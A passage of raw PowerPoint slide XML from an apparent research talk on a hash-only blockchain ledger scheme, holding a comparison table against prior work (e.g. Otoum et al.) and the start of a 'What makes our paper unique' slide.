                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Contracts</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="420624">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Otoum et al. [10]</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>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91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Trust state</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="420624">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>This work</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="accent5"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>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91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="accent5"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>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91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="accent5"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>None</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="accent5"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>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91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="accent5"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="table source"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4434840"/>
            <a:ext cx="8046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Adapted from Table I of the paper. Reference numbers follow the paper.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OUR CONTRIBUTION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What makes our paper unique</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="unique horizontal rule"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2944368"/>
            <a:ext cx="8046720" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="unique vertical rule"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="1417320"/>
            <a:ext cx="9144" cy="3063240"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="unique 1 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="unique 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="1417320"/>
            <a:ext cx="3063240" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Nothing on-chain but hashes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>No contracts, no registry, no messages between nodes: the smallest trusted surface.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="unique 2 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="1417320"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="unique 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5486400" y="1417320"/>
            <a:ext cx="3063240" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Anyone can catch up</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A newcomer rebuilds the full view from ledger history alone, at 3.01 ms per block.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="unique 3 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3063240"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="unique 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="3063240"/>
